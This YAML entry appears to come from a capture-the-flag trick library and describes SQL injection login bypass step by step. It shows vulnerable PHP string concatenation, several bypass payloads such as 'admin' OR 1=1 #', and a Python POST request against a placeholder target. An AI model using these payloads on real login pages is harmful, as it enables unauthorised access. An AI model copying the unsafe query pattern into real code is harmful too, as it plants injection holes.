name: sql_injection_login_bypass
category: web
tags: [sqli, sql_injection, authentication_bypass, login]
indicators:
  - "SQL query with string concatenation"
  - "Login form"
  - "No input sanitization"
  - "Direct variable insertion in SQL"

tricks:
  - name: "Step 1: Discover login page"
    when: "First access"
    how: "Observe functionality"
    payload: |
      # Admin Login link -> /admin.php
      # Login form with username and password

  - name: "Step 2: Identify SQL injection"
    when: "Analyze source code"
    how: "Find unsafe SQL concatenation"
    payload: |
      $username = $_POST['username'];  # Not escaped!
      $sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";

  - name: "Step 3: Test injection"
    when: "Suspect SQL injection"
    how: "Input special characters"
    payload: |
      username: admin'
      # If SQL error or abnormal behavior, injection exists

  - name: "Step 4: Craft bypass payload"
    when: "Confirmed injection"
    how: "Use OR condition and comment"
    payload: |
      # Payload: admin' OR 1=1 #
      # Result SQL: WHERE username = 'admin' OR 1=1 #' AND password = '...'
      # Always returns results!

  - name: "Step 5: Extract the flag"
    when: "Execute attack"
    how: "Send POST request"
    payload: |
      data = {'username': "admin' OR 1=1 #", 'password': 'anything'}
      resp = requests.post('http://TARGET/admin.php', data=data)
      # Successfully logged in, flag displayed

  - name: "Alternative: Other SQL injection techniques"
    when: "Different scenarios"
    how: "Use different comments and logic"
    payload: |
      admin' #              # Hash comment
      admin' --             # Double dash comment
      admin' OR '1'='1      # String comparison
      ' OR 1=1 #            # Don't need to know username

